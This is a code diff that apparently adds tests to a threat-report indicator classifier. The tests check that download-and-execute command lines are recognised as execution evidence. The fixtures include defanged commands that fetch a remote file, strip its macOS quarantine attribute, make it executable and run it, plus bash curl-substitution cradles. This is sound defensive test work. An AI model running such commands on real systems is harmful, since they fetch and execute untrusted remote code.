@@ -92,3 +92,37 @@ test('P-3 negative. a stored value glued to a shell separator is not the cradle 
   assert.equal(r.ok, false);
   assert.equal(r.code, 'promote_insufficient_evidence');
 });
+
+// P-4 (30-report review queue): command-substitution and download-chmod-run
+// cradles execute the fetched URL just like `curl … | sh`.
+const CRADLES_V2 = [
+  ['/bin/bash -c "$(curl -fsSL hxxp://198.51.100[.]30/6wioz8285kcbax6v)"', 'http://198.51.100.30/6wioz8285kcbax6v'],
+  ['cd $TMPDIR && curl -O hxxp://198.51.100[.]30/1v07y9e1m6v7thl6 && xattr -c 1v07y9e1m6v7thl6 && chmod +x 1v07y9e1m6v7thl6 && ./1v07y9e1m6v7thl6', 'http://198.51.100.30/1v07y9e1m6v7thl6'],
+  ['wget -q hxxps://stage-node[.]example-bad[.]net/m -O /tmp/m; chmod 755 /tmp/m; ./m', 'https://stage-node.example-bad.net/m']
+];
+
+test('P-4. bash -c "$(curl …)" and download → chmod +x → run are execution cradles', () => {
+  for (const [code, url] of CRADLES_V2) {
+    const c = find(run(code), url);
+    assert.ok(c, `${url} is a candidate`);
+    const row = persisted(c);
+    assert.equal(isReportIndicatorMember(row), false, 'never a member on its own');
+    const ok = classifyPromoteEligibility(row, { corroboration: CORROBORATION });
+    assert.equal(ok.ok, true, `${code}: ${JSON.stringify(ok)}`);
+    assert.equal(ok.basis, 'operational_evidence');
+  }
+});
+
+test('P-4 negative. fanged installer substitution and a download that is never run stay refused', () => {
+  const fanged = find(run('/bin/bash -c "$(curl -fsSL https://raw.installer-vendor.example/install.sh)"'), 'https://raw.installer-vendor.example/install.sh');
+  assert.ok(fanged);
+  const a = classifyPromoteEligibility(persisted(fanged), { corroboration: CORROBORATION });
+  assert.equal(a.ok, false);
+  assert.equal(a.code, 'promote_insufficient_evidence');
+
+  const notRun = find(run('curl -O hxxp://198.51.100[.]30/notes.txt && chmod 644 notes.txt'), 'http://198.51.100.30/notes.txt');
+  assert.ok(notRun);
+  const b = classifyPromoteEligibility(persisted(notRun), { corroboration: CORROBORATION });
+  assert.equal(b.ok, false);
+  assert.equal(b.code, 'promote_insufficient_evidence');
+});
